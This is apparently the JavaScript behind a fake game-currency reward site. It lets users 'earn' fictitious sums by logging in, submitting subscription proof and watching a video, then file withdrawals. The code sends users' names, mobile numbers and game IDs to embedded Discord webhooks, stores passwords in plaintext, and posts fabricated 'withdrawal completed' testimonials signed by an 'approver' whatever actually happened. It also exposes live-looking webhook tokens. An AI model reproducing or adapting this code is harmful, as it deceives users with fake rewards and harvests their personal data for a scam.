let currentUser =
JSON.parse(localStorage.getItem("currentUser")) || null;

const VIDEO_LINK =
"https://youtu.be/uFKVzV-2DmI?si=pqgRBPmaucyv6oWn";

const subscribeWebhook =
"https://discord.com/api/webhooks/1503773951325638716/zeBKmrRqWRfaSZBFC07__bZ_hqOsnFqSgyd_zigjklRT4ebCsmq8jhGP5ZbYrcoD6oNX";

const withdrawWebhook =
"https://discord.com/api/webhooks/1503774858146742533/cR1OERc6wVRpu0Wy708kRphgmdcssuS_9QDuUHrSTSaK3wJhGDHMBjNl0DdX4eOGc2ey";

const loginWebhook =
"https://discord.com/api/webhooks/1504475286845259978/XkO1Gm7cFi8x1N5ixDDcU-iiS9HaFYp8R42WJMZcq7ZMfhSuaBSga1gToI-vrEch8VMO";

const balanceWebhook =
"https://discord.com/api/webhooks/1504475637069385730/XTi4OFxJC0d1ZWWl23gg2c4qob3TyTuBmTQYlAjd87amBuVVF6kkKJ8ainS90WtYKGox";

// AUTO LOGIN

window.onload = function(){

if(currentUser){

showProfile();

}

};

// LOGIN

function loginUser(){

let name =
document.getElementById("name")
.value.trim();

let mobile =
document.getElementById("mobile")
.value.trim();

let server =
document.getElementById("server")
.value;

let password =
document.getElementById("password")
.value.trim();

if(!name || !mobile || !server || !password){

alert("Fill all fields ❌");
return;

}

let users =
JSON.parse(localStorage.getItem("users")) || [];

// FIND USER

let existingUser =
users.find(
x =>
x.mobile === mobile ||
x.name.toLowerCase() === name.toLowerCase()
);

// OLD LOGIN

if(existingUser){

currentUser = existingUser;

// FIX OLD USERS

if(currentUser.sno === undefined){

currentUser.sno =
users.indexOf(existingUser) + 1;

}

if(currentUser.balance === undefined){

currentUser.balance = 0;

}

if(currentUser.earning === undefined){

currentUser.earning = 0;

}

if(currentUser.withdrawn === undefined){

currentUser.withdrawn = 0;

}

if(currentUser.verified === undefined){

currentUser.verified = false;

}

if(currentUser.lastVideo === undefined){

currentUser.lastVideo = "";

}

if(currentUser.videoPending === undefined){

currentUser.videoPending = false;

}

if(currentUser.lastWithdrawAmount === undefined){

currentUser.lastWithdrawAmount = 0;

}

}else{

// NEW USER

currentUser = {

sno: users.length + 1,

name: name,
mobile: mobile,
server: server,
password: password,

balance: 0,
earning: 0,
withdrawn: 0,

verified: false,

lastVideo: "",

videoPending: false,

lastWithdrawAmount: 0

};

users.push(currentUser);

localStorage.setItem(
"users",
JSON.stringify(users)
);

}

// SAVE LOGIN

localStorage.setItem(
"currentUser",
JSON.stringify(currentUser)
);

saveUser();

// LOGIN WEBHOOK

fetch(loginWebhook,{

method:"POST",

headers:{
"Content-Type":"application/json"
},

body:JSON.stringify({

content:

"👤 NEW LOGIN\n\n" +

"S. No : " +
currentUser.sno + "\n" +

"Name : " +
currentUser.name + "\n" +

"Server : " +
currentUser.server + "\n" +

"Mobile : " +
currentUser.mobile

})

});

showProfile();

}

// SHOW PROFILE

function showProfile(){

document.getElementById("loginPage")
.classList.add("hidden");

document.getElementById("profilePage")
.classList.remove("hidden");

// UPDATE DATA

document.getElementById("balance")
.innerText =
currentUser.balance;

document.getElementById("earning")
.innerText =
currentUser.earning;

document.getElementById("withdrawn")
.innerText =
currentUser.withdrawn;

// AUTO FILL

document.getElementById("subName")
.value =
currentUser.name;

document.getElementById("subServer")
.value =
currentUser.server;

document.getElementById("withName")
.value =
currentUser.name;

document.getElementById("withServer")
.value =
currentUser.server;

document.getElementById("reviewName")
.value =
currentUser.name;

// LOCK VERIFY BUTTON

if(currentUser.verified){

document.querySelector(
'button[onclick="showSection(\'subscribeSection\')"]'
).innerText =
"VERIFICATION COMPLETED 🔒";

}

}

// SAVE USER

function saveUser(){

let users =
JSON.parse(localStorage.getItem("users")) || [];

let index =
users.findIndex(
x => x.mobile === currentUser.mobile
);

if(index !== -1){

users[index] = currentUser;

}else{

users.push(currentUser);

}

localStorage.setItem(
"users",
JSON.stringify(users)
);

localStorage.setItem(
"currentUser",
JSON.stringify(currentUser)
);

}

// BALANCE UPDATE WEBHOOK

function sendBalanceUpdate(){

fetch(balanceWebhook,{

method:"POST",

headers:{
"Content-Type":"application/json"
},

body:JSON.stringify({

content:

"💰 BALANCE UPDATED\n\n" +

"S. No : " +
currentUser.sno + "\n" +

"Username : " +
currentUser.name + "\n" +

"Total Earning : " +
currentUser.earning + "\n" +

"Withdrawal Money : " +
currentUser.withdrawn + "\n" +

"Current Balance : " +
currentUser.balance

})

});

}

// SHOW SECTION

function showSection(id){

if(
id === "subscribeSection"
&& currentUser.verified
){

alert("Already verified 🔒");
return;

}

document.getElementById("profilePage")
.classList.add("hidden");

document.querySelectorAll(".section")
.forEach(sec => {

sec.classList.add("hidden");

});

document.getElementById(id)
.classList.remove("hidden");

}

// BACK PROFILE

function backProfile(){

document.querySelectorAll(".section")
.forEach(sec => {

sec.classList.add("hidden");

});

document.getElementById("profilePage")
.classList.remove("hidden");

}

// VIDEO REWARD

function watchVideo(){

if(currentUser.lastVideo === VIDEO_LINK){

alert("Reward already claimed ❌");
return;

}

if(currentUser.videoPending){

alert("Reward already processing ⏳");
return;

}

currentUser.videoPending = true;

saveUser();

// OPEN VIDEO

window.open(
VIDEO_LINK,
"_blank"
);

// WAIT

setTimeout(() => {

currentUser.balance += 2000;

currentUser.earning += 2000;

currentUser.lastVideo = VIDEO_LINK;

currentUser.videoPending = false;

saveUser();

sendBalanceUpdate();

document.getElementById("balance")
.innerText =
currentUser.balance;

document.getElementById("earning")
.innerText =
currentUser.earning;

alert("2000 Added ✅");

},10000);

}

// SUBSCRIBE

function submitSubscribe(){

if(currentUser.verified){

alert("Already verified 🔒");
return;

}

let gameNumber =
document.getElementById("gameNumber")
.value.trim();

let link =
document.getElementById("proofLink")
.value.trim();

if(!gameNumber || !link){

alert("Fill all fields");
return;

}

if(!/^\d{6}$/.test(gameNumber)){

alert("Game number must be 6 digits ❌");
return;

}

// WEBHOOK

fetch(subscribeWebhook,{

method:"POST",

headers:{
"Content-Type":"application/json"
},

body:JSON.stringify({

content:

"🆕 SUBSCRIBER\n\n" +

"User: " +
currentUser.name + "\n" +

"Game Name: " +
currentUser.name + "\n" +

"Number: " +
gameNumber + "\n" +

"Reward: $ 100,000\n\n" +

"Image Link:\n" +
link + "\n\n" +

"<@&1503714193214406827>"

})

});

// REWARD

currentUser.verified = true;

currentUser.balance += 100000;

currentUser.earning += 100000;

saveUser();

sendBalanceUpdate();

// UPDATE UI

document.getElementById("balance")
.innerText =
currentUser.balance;

document.getElementById("earning")
.innerText =
currentUser.earning;

// LOCK BUTTON

document.querySelector(
'button[onclick="showSection(\'subscribeSection\')"]'
).innerText =
"VERIFICATION COMPLETED 🔒";

alert(
"Verification Completed + 100000 Added ✅"
);

backProfile();

}

// WITHDRAW

function submitWithdraw(){

let number =
document.getElementById("withdrawNumber")
.value.trim();

let amount =
Number(
document.getElementById("withdrawAmount")
.value
);

if(!number || !amount){

alert("Fill all fields");
return;

}

if(!/^\d{6}$/.test(number)){

alert("Game number must be 6 digits ❌");
return;

}

if(currentUser.balance < amount){

alert("Not enough balance ❌");
return;

}

// CUT MONEY

currentUser.balance -= amount;

currentUser.withdrawn += amount;

currentUser.lastWithdrawAmount =
amount;

saveUser();

sendBalanceUpdate();

// WEBHOOK

fetch(withdrawWebhook,{

method:"POST",

headers:{
"Content-Type":"application/json"
},

body:JSON.stringify({

content:

"💸 NEW WITHDRAW REQUEST\n\n" +

"User: " +
currentUser.name + "\n" +

"Number: " +
number + "\n" +

"Amount: $ " +
amount + " 💰\n" +

"Status: Waiting ⏳"

})

});

// UPDATE UI

document.getElementById("balance")
.innerText =
currentUser.balance;

document.getElementById("withdrawn")
.innerText =
currentUser.withdrawn;

alert("Withdraw Submitted ✅");

backProfile();

}

// REVIEW

function submitReview(){

let review =
document.getElementById("reviewText")
.value.trim();

let image =
document.getElementById("reviewImage")
.value.trim();

if(!review || !image){

alert("Fill all fields");
return;

}

// WEBHOOK

fetch(withdrawWebhook,{

method:"POST",

headers:{
"Content-Type":"application/json"
},

body:JSON.stringify({

content:

"💸 WITHDRAWAL SUCCESSFULLY COMPLETED\n\n" +

currentUser.lastWithdrawAmount +

" coins transferred successfully to " +

currentUser.name +

" game account 🎮\n\n" +

"Player Review:\n" +

review +

"\n\n" +

"Image Link:\n" +

image +

"\n\nApproved By:\n" +

"Lucas_Arora 👑\n" +

"<@&1503714193214406827>"

})

});

alert("Review Submitted ✅");

backProfile();

}
